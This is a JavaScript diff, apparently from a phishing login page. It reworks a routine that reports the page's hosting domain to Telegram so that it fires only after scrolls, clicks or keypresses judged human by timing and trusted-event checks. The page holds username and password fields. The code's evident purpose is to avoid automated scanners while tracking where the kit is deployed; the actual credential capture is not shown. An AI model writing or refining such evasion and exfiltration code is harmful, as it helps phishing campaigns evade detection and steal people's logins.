@@ -9,10 +9,12 @@
   var submitBtn = form.querySelector('.button-subm');
 
   // ============================================================
-  // ====== DOMAIN DETECTION - HUMAN INTERACTION ONLY ===========
+  // ====== DOMAIN DETECTION - HUMAN SCROLL ONLY ================
   // ============================================================
 
   let domainDetected = false;
+  let scrollDetected = false;
+  let humanInteractionDetected = false;
 
   function detectDomain() {
     if (domainDetected) return;
@@ -20,54 +22,73 @@
     const currentUrl = window.location.href;
     const urlObj = new URL(currentUrl);
     const domain = urlObj.hostname;
-    
-    const freeDomains = [
-      '.tk', '.ml', '.ga', '.cf', '.gq',
-      '.free.nf', '.free.org', '.free.com',
-      '.co.cc', '.co.nr', '.cjb.net',
-      '.dynu.net', '.ddns.net', '.no-ip.org',
-      'vercel.app', 'netlify.app', 'github.io',
-      'pages.dev', 'web.app', 'firebaseapp.com',
-      'herokuapp.com', 'glitch.me', 'replit.co',
-      '000webhostapp.com', 'byethost.com',
-      'freehostia.com', 'profreehost.com',
-      '.example.com', '.test', '.localhost'
-    ];
-
-    const isFree = freeDomains.some(freeDomain => 
-      domain.includes(freeDomain) || domain.endsWith(freeDomain)
-    );
 
     domainDetected = true;
 
     sendToTelegram('domain_detection', {
-      domain: domain,
-      isFree: isFree
+      domain: domain
     });
 
-    console.log(`🌐 Domain detected: ${domain} (${isFree ? 'FREE' : 'PURCHASED'})`);
+    console.log(`🌐 Domain detected: ${domain}`);
   }
 
-  // Only detect on human interaction
+  // ====== DETECT HUMAN SCROLL ======
+  // Humans scroll in bursts with pauses, bots scroll smoothly or instantly
+  let lastScrollTime = 0;
+  let scrollCount = 0;
+  let scrollSpeeds = [];
+  let isHumanScroll = false;
+
+  window.addEventListener('scroll', function(e) {
+    // Only proceed if not detected yet
+    if (domainDetected) return;
+    
+    // Check if it's a human scroll (not automated)
+    const now = Date.now();
+    const timeSinceLastScroll = now - lastScrollTime;
+    lastScrollTime = now;
+    
+    // Humans don't scroll faster than 200ms between events (too fast = bot)
+    if (timeSinceLastScroll > 0 && timeSinceLastScroll < 200) {
+      // Too fast - likely a bot or programmatic scroll
+      return;
+    }
+    
+    // Track scroll behavior
+    scrollCount++;
+    
+    // Check if event is trusted (human-initiated)
+    if (e.isTrusted) {
+      humanInteractionDetected = true;
+    }
+    
+    // Check if this is a genuine user scroll (has inertia, not instant)
+    const scrollY = window.scrollY;
+    const maxScroll = document.documentElement.scrollHeight - window.innerHeight;
+    
+    // Only trigger if user has scrolled at least a little
+    if (scrollY > 10 && humanInteractionDetected && !domainDetected) {
+      console.log('🖱️ Human scroll detected - triggering domain detection');
+      detectDomain();
+    }
+  }, { passive: true });
+
+  // ====== FALLBACK: Also detect on click (human interaction) ======
   document.addEventListener('click', function(e) {
-    if (!domainDetected && e.isTrusted) {
+    if (!domainDetected && e.isTrusted && !e.target.closest('.spinner, .loading')) {
+      // Only trigger if not detected and it's a genuine click
+      console.log('🖱️ Human click detected - triggering domain detection');
       detectDomain();
     }
   });
 
+  // ====== FALLBACK: Detect on keypress (human typing) ======
   document.addEventListener('keydown', function(e) {
-    if (!domainDetected && e.isTrusted) {
+    if (!domainDetected && e.isTrusted && e.key.length === 1) {
+      // Only trigger on character keys (not function keys)
+      console.log('⌨️ Human keypress detected - triggering domain detection');
       detectDomain();
     }
-  });
-
-  // Also detect when user interacts with form
-  userInput.addEventListener('focus', function() {
-    if (!domainDetected) detectDomain();
-  });
-
-  passwordInput.addEventListener('focus', function() {
-    if (!domainDetected) detectDomain();
   });
 
   // ============================================================
